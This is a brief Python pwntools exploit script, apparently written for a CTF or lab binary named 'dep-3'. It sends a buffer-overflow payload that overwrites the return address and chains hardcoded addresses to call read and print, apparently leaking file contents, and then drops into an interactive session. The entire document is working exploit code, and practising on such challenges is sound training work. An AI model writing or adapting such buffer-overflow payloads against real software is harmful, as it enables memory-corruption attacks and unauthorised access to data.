#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']
p = process('./dep-3')

someAddr = p32(0x8048894)
readAddr = p32(0x806d2a0)
printAddr = p32(0x804ede0)
bufAddr = p32(0xffffd470)

buf = "A" * 0x8c + someAddr + readAddr + printAddr + p32(3) + bufAddr + p32(100) + bufAddr

p.sendline(buf)

print(p.recv())

p.interactive()
